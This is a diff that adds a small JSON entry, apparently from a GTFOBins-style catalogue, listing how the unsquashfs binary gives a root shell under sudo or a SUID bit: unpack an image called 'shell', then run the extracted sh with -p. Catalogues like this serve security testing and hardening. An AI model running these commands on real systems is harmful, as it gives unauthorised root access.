@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        
+        "code": "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./unsquashfs shell\n./squashfs-root/sh -p\n"
+      }
+    ]
+  }
+}
